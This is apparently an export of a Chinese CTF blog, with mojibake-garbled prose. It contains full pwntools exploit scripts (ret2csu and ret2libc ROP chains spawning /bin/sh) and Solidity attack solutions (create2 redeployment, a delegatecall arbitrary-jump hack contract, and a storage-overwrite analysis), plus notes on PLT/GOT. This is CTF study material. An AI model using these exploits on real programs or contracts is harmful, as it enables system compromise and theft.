&apos;__main__&apos;: write_plt = level5.plt[&apos;write&apos;] write_got = level5.got[&apos;write&apos;] start_addr = level5.symbols[&apos;_start&apos;] bss_addr = level5.bss() read_got = level5.got[&apos;read&apos;] lg(&apos;write_plt&apos;, write_plt) lg(&apos;write_got&apos;, write_got) lg(&apos;start_addr&apos;, start_addr) lg(&apos;bss_addr&apos;, bss_addr) ru(&apos;Hello, World\n&apos;) # write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, start_addr) write_addr = u64(rv(8)) lg(&apos;write_addr&apos;, write_addr) # 0x250 libc_base_addr = write_addr - libc.symbols[&apos;write&apos;] lg(&apos;libc_base_addr&apos;, libc_base_addr) system_addr = libc_base_addr + libc.symbols[&apos;system&apos;] lg(&apos;system_addr&apos;, system_addr) binsh_addr = libc_base_addr + libc.search(&quot;/bin/sh&quot;).next() lg(&apos;binsh_addr&apos;, binsh_addr) ru(&apos;Hello, World\n&apos;) # read(0,bss_base,16) # read system and /bin/sh\x00 csu(0, 1, read_got, 16, bss_addr, 0, start_addr) sn(p64(system_addr)+&apos;/bin/sh\x00&apos;) # gdb.attach(p) # pause() ru(&apos;Hello, World\n&apos;) # csu(0, 1, bss_addr, 0, 0, bss_addr+8, start_addr) # system(bss_base+8) payload = &apos;a&apos;*0x80 payload += &apos;b&apos;*8 # å°±æ˜¯è¿™ä¸ªåœ°æ–¹å¤šäº†ä¸€æ¡movapså‘½ä»¤ï¼Œæ‰€ä»¥è·³ä¸è¿‡åŽ»ï¼Œæ‰€ä»¥éœ€è¦pop ripä¸€ä¸‹ï¼Œå¦‚æžœæ˜¯ubuntu16.04åº”è¯¥æ˜¯æ­£å¸¸çš„ payload += p64(0x400624) payload += p64(csu_end_addr) payload += p64(0) payload += p64(1) payload += p64(bss_addr) payload += p64(0) payload += p64(0) payload += p64(bss_addr+8) payload += p64(csu_front_addr) payload += &apos;c&apos;*0x38 payload += p64(start_addr) sl(payload) pi()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ret2csu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[32&64]]></title>
    <url>%2F2020%2F32-64%2F</url>
    <content type="text"><![CDATA[32 ä½å’Œ 64 ä½ç¨‹åºçš„ä¸€äº›ç®€å•åŒºåˆ« éšæ—¶æ›´æ–°ï¼Œæƒ³åˆ°å“ªå†™åˆ°å“ª å‚æ•°é¡ºåº 32ä½ å‡½æ•°å‚æ•°åœ¨å‡½æ•°è¿”å›žåœ°å€çš„ä¸Šæ–¹ å‚æ•°ä»Žå³å‘å·¦ä¾æ¬¡æ”¾å…¥æ ˆä¸­ 64ä½ å½“å‚æ•°å°äºŽ 7 ä¸ªæ—¶ï¼Œå‚æ•°ä»Žå·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨ï¼š rdiã€rsiã€rdxã€rcxã€r8ã€r9 å½“å‚æ•°ä¸º 7 ä¸ªä»¥ä¸Šæ—¶ï¼Œå‰ 6 ä¸ªä¸Žå‰é¢ä¸€æ ·ï¼Œä½†åŽé¢çš„ä¾æ¬¡ä»Žå³å‘å·¦æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2libc3]]></title>
    <url>%2F2020%2Fret2libc3%2F</url>
    <content type="text"><![CDATA[ctf-wiki ä¸­ ret2libc3 æ²¡æœ‰ system å’Œ /bin/sh ï¼Œæ³„æ¼ libc Analyse æ³„æ¼ _start åœ°å€ èŽ·å– libc ç‰ˆæœ¬ èŽ·å– system ä¸Ž /bin/sh åœ°å€ å†æ¬¡æ‰§è¡Œæºç¨‹åº è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(&#39;/bin/sh&#39;) Exp 1 è‡ªå·±å†™çš„ exp ï¼Œæ ¹æ®æ³„æ¼çš„åœ°å€å…ˆæ‰¾åˆ° libc åˆ°è¿”å›žåœ°å€çš„åç§»å¯ä½¿ç”¨ cyclic å¿«é€Ÿåˆ¤æ–­12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *local = 1pc = './ret2libc3'aslr = Truecontext.log_level = True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def dbg(b=""): gdb.attach(io, b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] lg('start_addr', start_addr) payload = 'a' * 112 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) payload += '\x00' sl(payload) ru('Can you find it !?') libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr',libc_start_main_addr) distance = libc.symbols['system'] - libc.symbols['__libc_start_main'] lg('distance', distance) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] system_addr = libc_base_addr + libc.symbols['system'] binsh_addr = libc_base_addr + libc.search("/bin/sh").next() lg('system_addr', system_addr) lg('binsh_addr', binsh_addr) payload = 'a' * 112 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi() Exp 2 å…ˆæ³„æ¼ libc ï¼Œç„¶åŽä½¿ç”¨ one_gadget1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *local = 1pc='./ret2libc3'aslr = Truecontext.log_level = True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc = ELF('./libc6_2.27-3ubuntu1.2_i386.so')ret2libc3 = ELF('./ret2libc3')if local == 1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc, aslr=aslr) #gdb.attach(p,'c')else: remote_addr = ['111.198.29.45', 39802] p = remote(remote_addr[0], remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x, drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a, b)sla = lambda a,b : p.sendlineafter(a, b)pi = lambda : p.interactive()def dbg(b=""): gdb.attach(io , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, '\x00')) else: return u64(rl().strip('\n').ljust(8, '\x00'))if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] lg('start_addr', start_addr) payload = 'a' * 112 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) sl(payload) ru('Can you find it !?') libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr',libc_start_main_addr) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] one_gadget = libc_base_addr + 0x3d130 payload = 'a' * 112 payload += p32(one_gadget) sl(payload) pi()"""0x3d130 execve("/bin/sh", esp+0x40, environ)constraints: esi is the GOT address of libc [esp+0x40] == NULL""" Exp 3 ç½‘ä¸Šæ‰¾çš„å¦ä¸€ä¸ªç‰ˆæœ¬ä½¿ç”¨ LibcSearcher æ³„æ¼ libc12345678910111213141516171819202122232425262728##coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('./ret2libc3')puts_plt = ret2libc3.plt['puts']libc_start_main_got = ret2libc3.got['__libc_start_main']main = ret2libc3.symbols['_start']print("leak main_got addr and return main")payload = flat(['A'*112,puts_plt,main,libc_start_main_got])sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4])print(hex(libc_start_main_addr))libc = LibcSearcher('__libc_start_main',libc_start_main_addr)libcbase = libc_start_main_addr-libc.dump('__libc_start_main')system_addr = libcbase+libc.dump('system')binsh_addr = libcbase +libc.dump('str_bin_sh')print("now get shell")payload = flat(['A'*112,system_addr,'A'*4,binsh_addr])sh.send(payload)sh.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ret2libc3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[plt&got]]></title>
    <url>%2F2020%2Fplt-got%2F</url>
    <content type="text"><![CDATA[å­¦ä¹ ä¸€äº› pwn çš„çŸ¥è¯†ï¼Œç®€å•è®°å½•å¸®åŠ©è‡ªå·±ç†è§£ Preview .got GOT(Global Offset Table) å…¨å±€åç§»è¡¨ã€‚è¿™æ˜¯é“¾æŽ¥å™¨ä¸ºå¤–éƒ¨ç¬¦å·å¡«å……çš„å®žé™…åç§»è¡¨ã€‚ .plt PLT(Procedure Linkage Table) ç¨‹åºé“¾æŽ¥è¡¨ã€‚å®ƒæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œè¦ä¹ˆåœ¨ .got.plt èŠ‚ä¸­æ‹¿åˆ°åœ°å€å¹¶è·³è½¬ï¼Œè¦ä¹ˆå½“ .got.plt æ²¡æœ‰æ‰€éœ€åœ°å€æ—¶ï¼Œè§¦å‘é“¾æŽ¥å™¨åŽ»æ‰¾åˆ°æ‰€éœ€åœ°å€ã€‚ .got.plt è¿™ä¸ªæ˜¯ GOT ä¸“é—¨ä¸º PLT ä¸“é—¨å‡†å¤‡çš„èŠ‚ã€‚.got.plt ä¸­çš„å€¼æ˜¯ GOT çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒåŒ…å«ä¸Šè¿° PLT è¡¨æ‰€éœ€çš„åœ°å€ï¼ˆå·²ç»æ‰¾åˆ°çš„å’Œéœ€è¦åŽ»è§¦å‘çš„ï¼‰ .plt.got Unknown Analyse ä¸‹é¢æ‰€æœ‰çš„å›¾ç‰‡æ¥è‡ªäºŽ https://blog.csdn.net/weixin_44681716/article/details/89877497 ç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸º PLT è¡¨ï¼Œä¸€ä¸ªä¸º GOT è¡¨ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ç›¸å¯¹åº”çš„ã€‚PLT è¡¨ä¸­çš„æ¯ä¸€é¡¹çš„æ•°æ®å†…å®¹éƒ½æ˜¯å¯¹åº”çš„ GOT è¡¨ä¸­ä¸€é¡¹çš„åœ°å€ï¼Œè¿™ä¸ªæ˜¯å›ºå®šä¸å˜çš„ï¼ŒPLT è¡¨ä¸­çš„æ•°æ®ä¸æ˜¯å‡½æ•°çš„çœŸå®žåœ°å€ï¼Œè€Œæ˜¯ GOT è¡¨é¡¹çš„åœ°å€ã€‚ ä¸‹å›¾æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°çš„æµç¨‹ ç¬¬ä¸€æ­¥ï¼Œç”±å‡½æ•°è°ƒç”¨è·³å…¥åˆ° PLT è¡¨ä¸­ ç¬¬äºŒæ­¥ï¼ŒPLT è¡¨è·³åˆ° GOT è¡¨ä¸­ ç¬¬ä¸‰æ­¥ï¼ŒGOT è¡¨å›žè·³åˆ° PLT è¡¨ä¸­ï¼Œè¿™æ—¶å€™è¿›è¡ŒåŽ‹æ ˆï¼ŒæŠŠä»£è¡¨å‡½æ•°çš„ ID åŽ‹æ ˆ ç¬¬å››æ­¥ï¼Œè·³è½¬åˆ°å…¬å…±çš„ PLT è¡¨é¡¹ä¸­ ç¬¬äº”æ­¥ï¼Œè¿›å…¥åˆ° GOT è¡¨ ç¬¬å…­æ­¥ï¼Œ_dl_runtime_resolve å¯¹åŠ¨æ€å‡½æ•°è¿›è¡Œåœ°å€è§£æžå’Œé‡å®šä½ ç¬¬ä¸ƒæ­¥ï¼ŒæŠŠåŠ¨æ€å‡½æ•°çœŸå®žçš„åœ°å€å†™å…¥åˆ° GOT è¡¨é¡¹ä¸­ ç¬¬å…«æ­¥ï¼Œæ‰§è¡Œå‡½æ•°å¹¶è¿”å›ž ä¸‹å›¾æ˜¯ç¬¬äºŒæ¬¡è°ƒç”¨å‡½æ•°çš„æµç¨‹ ç¬¬ä¸€æ­¥ï¼Œç”±å‡½æ•°è°ƒç”¨è°ƒå…¥åˆ° PLT è¡¨ä¸­ ç¬¬äºŒæ­¥ï¼Œè·³å…¥åˆ° GOT è¡¨ï¼Œç”±äºŽè¿™æ—¶å€™è¯¥è¡¨é¡¹å·²ç»æ˜¯åŠ¨æ€å‡½æ•°çš„çœŸå®žåœ°å€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æŽ¥æ‰§è¡Œç„¶åŽè¿”å›ž Referencehttps://blog.csdn.net/weixin_44681716/article/details/89877497https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>plt</tag>
        <tag>got</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¬¬äº”ç©ºé—´ CreativityPlus & SafeDelegatecall]]></title>
    <url>%2F2020%2Fcreativityplus%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬äº”ç©ºé—´ creativityplus é¢˜ç›® creativityplus é¢˜ç›®æœ‰ä¸ªéžé¢„æœŸï¼Œç›´æŽ¥éƒ¨ç½²ä¸€ä¸ªå­—èŠ‚ stop æŒ‡ä»¤ä¹Ÿå¯ä»¥ï¼Œ0x600a600c60003960016000f3+00 æ–‡ç« ä»‹ç»é¢„æœŸè§£ CreativityPlus é¢˜ç›®å¾ˆç®€å•ï¼Œæ”¹ç¼–è‡ª Creativity é¢˜ç›®ï¼Œç®€ç§° CreativityPlus å‡çº§ç‰ˆ è€ƒç‚¹ create2 ä¸Ž bytecode é¢˜ç›®é€»è¾‘å¦‚ä¸‹ï¼š éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå¤§å°ä¸è¶…è¿‡ 4 å­—èŠ‚ è°ƒç”¨ check ï¼Œå‚æ•°æ˜¯æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦åœ°å€ è°ƒç”¨ executeï¼Œä½¿å¾—è¿”å›žå€¼ä¸º trueï¼Œæˆ‘ä»¬å³å¯æˆä¸º owner ä½†æ˜¯æˆ‘ä»¬æ²¡æ³•åœ¨ 4 ä¸ªå­—èŠ‚å†… emit SendFlag create2 éªšæ“ä½œï¼Œä½¿ç”¨å¦‚ä¸‹ä»£ç å¯å°†ä¸åŒ bytecode éƒ¨ç½²åˆ°åŒä¸€ä¸ªåœ°å€ä¸Šï¼ŒdeployedAddr å³ä¸ºéƒ¨ç½²çš„åˆçº¦åœ°å€ 123456789101112131415161718192021222324252627pragma solidity ^0.5.10;contract Deployer &#123; bytes public deployBytecode; address public deployedAddr; function deploy(bytes memory code) public &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex&apos;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&apos;; assembly &#123; a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866) &#125; deployedAddr = a; &#125;&#125;contract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; æ‰€ä»¥é¢˜ç›®çš„é€»è¾‘å¦‚ä¸‹: ç”¨ create2 çš„éªšæ“ä½œ,éƒ¨ç½²ä¸€ä¸ªåˆçº¦ 0x33ff ,å³ selfdestruct(msg.sender) è°ƒç”¨ check() ,è®© target ä¸ºæˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦åœ°å€ ç»™æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦å‘ä¸€ç¬”ç©ºäº¤æ˜“,è®©å®ƒè‡ªæ¯ å†æ¬¡ä½¿ç”¨ create2 éªšæ“ä½œ,åœ¨åŒä¸€ä¸ªåœ°å€éƒ¨ç½²åˆçº¦,åˆçº¦å†…å®¹å¤§å°ä¸è¶…è¿‡ 10 å­—èŠ‚ï¼Œè¿”å›ž 1 è¿”å›žå€¼ç”± return(p, s) æ“ä½œç å¤„ç†ï¼Œä½†æ˜¯åœ¨è¿”å›žå€¼ä¹‹å‰ï¼Œå¿…é¡»å…ˆå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½¿ç”¨ mstore(p, v) å°† 1 å­˜å‚¨åœ¨å†…å­˜ä¸­ é¦–å…ˆï¼Œä½¿ç”¨ mstore(p, v) å°† 1 å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå…¶ä¸­ p æ˜¯åœ¨å†…å­˜ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œ v æ˜¯åå…­è¿›åˆ¶å€¼ï¼Œ1 çš„åå…­è¿›åˆ¶æ˜¯ 0x01 1230x6001 ;PUSH1 0x01 v0x6080 ;PUSH1 0x80 p0x52 ;MSTORE ç„¶åŽï¼Œä½¿ç”¨ return(p, s) è¿”å›ž 0x01 ï¼Œå…¶ä¸­ p æ˜¯å€¼ 0x2a å­˜å‚¨çš„ä½ç½®ï¼Œs æ˜¯å€¼ 0x2a å­˜å‚¨æ‰€å çš„å¤§å° 0x20 ï¼Œå  32 å­—èŠ‚ 1230x6020 ;PUSH1 0x20 s0x6080 ;PUSH1 0x80 p0xf3 ;RETURN æ‰€ä»¥æˆ‘ä»¬åªéœ€ä½¿ç”¨ Deployer.deploy éƒ¨ç½² 0x600160805260206080f3 å³å¯ï¼Œæ­£å¥½ 10 opcodes è°ƒç”¨ execute æˆ‘ä»¬å³å¯æˆä¸º owner SafeDelegatecall1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465pragma solidity ^0.4.23;contract SafeDelegatecall &#123; address private owner; bytes4 internal constant SET = bytes4(keccak256(&apos;fifth(uint256)&apos;)); event SendFlag(address addr); uint randomNumber = 0; struct Func &#123; function() internal f; &#125; constructor() public payable &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; // 0x4b64e492 function execute(address _target) public payable&#123; require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &apos;unsafe execution&apos;); bytes4 sel; uint val; (sel, val) = getRet(); require(sel == SET); Func memory func; func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) &#125; func.f(); &#125; // 0x24b04905 function gift() private &#123; payforflag(); &#125; // 0xc37e74c7 function getRet() internal pure returns (bytes4 sel, uint val) &#123; assembly &#123; if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125; let ptr := mload(0x40) returndatacopy(ptr, 0, 0x24) sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) val := mload(add(0x04, ptr)) &#125; &#125; // 0x80e10aa5 function payforflag() public payable onlyOwner &#123; require(msg.value == 1, &apos;I only need a little money!&apos;); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function() payable public&#123;&#125;&#125; é¢˜ç›®å¯¹ delegatecall è¿”å›žå€¼è¿›è¡Œæ£€æŸ¥ï¼Œæœ‰æ•ˆé˜²æ­¢å…¶ç¯¡æ”¹è°ƒç”¨è€…åˆçº¦çš„ storage æ•°æ® é¢˜ç›®æœ‰ä¸ª backdoorï¼Œå­˜åœ¨ä»»æ„è·³è½¬ï¼Œä»»æ„è·³è½¬çš„å‚æ•°æœ‰ä¸¤ä¸ª mload(func)å’Œè¿”å›žå€¼ valï¼Œè·³è½¬çš„åœ°å€ä¸ºå®ƒä»¬çš„å·®å€¼ï¼Œè·³è½¬çš„ç›®çš„åœ°å€ä¸º 0x3c1 å³å¯ï¼Œè¿™ä¸ªè‡ªå·±é€†å‘å¯ä»¥åˆ†æžå‡ºæ¥ï¼Œå…¶ä¸­ mload(func) çš„å€¼ä¸º 0x48aï¼Œæ‰€ä»¥è¿”å›žå€¼ val = 0x48a-0x3c1 = 201 éƒ¨ç½²ä»¥ä¸‹åˆçº¦å¾—åˆ°æ”»å‡»åˆçº¦åœ°å€ addr ï¼Œè°ƒç”¨ execute(addr) å³å¯ 123456789101112contract hack &#123; bytes4 internal constant SEL = bytes4(keccak256(&apos;fifth(uint256)&apos;)); function execute(address) public pure &#123; bytes4 sel = SEL; assembly &#123; mstore(0,sel) mstore(0x4,201) revert(0,0x24) &#125; &#125;&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Create2</tag>
        <tag>Solidity</tag>
        <tag>Delegatecall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»¥å¤ªåŠèœœç½åˆçº¦æ”¶é›†åˆ—è¡¨]]></title>
    <url>%2F2020%2Fhoneypot-list%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ä¸»é“¾ä¸Šçš„èœœç½åˆçº¦ ä¸æ–­æ›´æ–°åˆ—è¡¨]]></content>
      <categories>
        <category>Ethereum</category>
      </categories>
      <tags>
        <tag>Ethereum</tag>
        <tag>Etherscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Real World CTF Finals 2019 - Montagy]]></title>
    <url>%2F2020%2FMontagy%2F</url>
    <content type="text"><![CDATA[å‰è¨€ rw2019 montagy åŒºå—é“¾é¢˜ç›® å¤çŽ°äº†ï¼Œä½†æ˜¯æ²¡æœ‰è®°å½•è¿‡ç¨‹ï¼Œè¿™é‡Œåªè®°å½•å¿ƒå¾— å¤çŽ°çš„åˆçº¦åœ°å€ï¼š0xd95C819d1DFBD085dFf0b3351230958Cb6075957@ropsten è¯¦ç»† WP è§ https://x9453.github.io/2020/01/26/Real-World-CTF-Finals-2019-Montagy/ åˆçº¦ç¡®å®šåŽä¼šæœ‰è‡ªå·±çš„ bytecode ï¼Œå¯¹ bytecode è¿›è¡Œ padding ä¸ä¼šå½±å“å…¶éƒ¨ç½²çš„ç»“æžœ å¯¹ bytecode è¿›è¡Œ padding è¦æ³¨æ„å¯¹é½é—®é¢˜ï¼Œç”¨ 0 è¡¥é½]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>rw2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF2020 roiscoin]]></title>
    <url>%2F2020%2Frctf2020-roiscoin%2F</url>
    <content type="text"><![CDATA[å‰è¨€ RCTF2020 åŒºå—é“¾ roiscoin é¢˜ç›® ä»¥å¤ªåŠ Ropsten æµ‹è¯•é“¾ Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt;= address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123; codex[idx] = tmp; &#125; &#125;&#125; Analyse é¢˜ç›®ç›´æŽ¥ç»™äº†æºç  é¢˜ç›®æœ‰éžé¢„æœŸï¼šbeOwner åœ¨åˆçº¦è´¦æˆ·ä½™é¢ä¸º 0 çš„æƒ…å†µä¸‹å¯ä»¥ç›´æŽ¥æˆä¸º owner ï¼Œè¿™ä¸ªæ²¡æœ‰æŽ§åˆ¶å¥½æ¡ä»¶ï¼ŒåŒæ—¶ settle é‚£é‡Œåº”è¯¥ä¹Ÿæœ‰éžé¢„æœŸï¼Œåº”è¯¥åªè®©çŒœ 3 æ¬¡ï¼Œç»“æžœä¹Ÿæ²¡æœ‰æŽ§åˆ¶å¥½æ¡ä»¶ï¼Œæœ¬æ–‡ä¸ä»‹ç»éžé¢„æœŸçš„åšæ³• æŠ›é™¤éžé¢„æœŸï¼Œè¿™é‡Œä»‹ç»ä¸‹é¢˜ç›®æ­£å¸¸çš„é€»è¾‘ï¼Œè€ƒç‚¹æœ‰ä¸‰ä¸ª: é¢„æµ‹éšæœºæ•°: è¿™é‡Œçš„éšæœºæ•°æ˜¯æœªæ¥çš„éšæœºæ•°,å¯ä»¥è¯´æ˜¯é¢„æµ‹æœªæ¥çš„éšæœºæ•°,çœ‹ä¼¼ä¸å¯èƒ½,å…³é”®åœ¨äºŽ guess çš„èŒƒå›´æ˜¯ 2 ,ä¹Ÿå°±æ˜¯åªæœ‰ 0 å’Œ 1 ,æ‰€ä»¥å¯ä»¥çˆ†ç ´ æœªåˆå§‹åŒ–çš„ç»“æž„ä½“ storage è¦†ç›–é—®é¢˜: settle ä¸­çš„ failedlog æœªåˆå§‹åŒ–ä¼šé€ æˆ storage å˜é‡è¦†ç›–,ä¼šè¦†ç›– codex æ•°ç»„é•¿åº¦ æ•°ç»„ä»»æ„å†™: å½“æ•°ç»„é•¿åº¦è¢«ä¿®æ”¹åŽ,å¯ä»¥è¦†ç›– owner ,å½“ç„¶è¿™å¯¹æ•°ç»„é•¿åº¦æœ‰ä¸€å®šçš„è¦æ±‚,æ ¹æ®æƒ…å†µé€‰æ‹©åˆé€‚çš„æ•°æ®,è¿™é‡Œæ˜¯ç”¨ msg.sender è¦†ç›–æ•°ç»„é•¿åº¦çš„é«˜ 20 å­—èŠ‚ exp éƒ¨ç½² hack åˆçº¦,è¿™é‡Œéœ€è¦æ³¨æ„: æ•°ç»„åœ¨ storage5 ä½ç½®, keccak256(bytes32(5)) = 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3db0 å½“æˆ‘ä»¬ä¿®æ”¹ codex[y],(y=2^256-x+6) æ—¶å°±èƒ½ä¿®æ”¹ slot 6 ï¼Œä»Žè€Œä¿®æ”¹ owner , å…¶ä¸­ x = keccak256(bytes32(5)) è®¡ç®—å‡º y = 114245411204874937970903528273105092893277201882823832116766311725579567940182 , å³ y = 0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256 æ‰€ä»¥æ•°ç»„çš„é•¿åº¦ codex.length è¦ &gt; y , ç”±äºŽ msg.sender è¦†ç›–æ•°ç»„é•¿åº¦çš„é«˜ 20 å­—èŠ‚,æ‰€ä»¥å…¶å®žæ˜¯å˜ç›¸è¦æ±‚ address(msg.sender) &gt; y , æˆ‘ä»¬å¯ä»¥ç”Ÿæˆä»¥ 0xfd æˆ– 0xfe æˆ– 0xff å¼€å¤´çš„åœ°å€å³å¯ç®€å•æ»¡è¶³è¿™ä¸€ç‚¹ è§£é¢˜æ­¥éª¤ è°ƒç”¨ hack1 è°ƒç”¨ hack2 ä¸€æ¬¡,è¿™ä¸€æ¬¡éœ€è¦æ»¡è¶³ result = 1 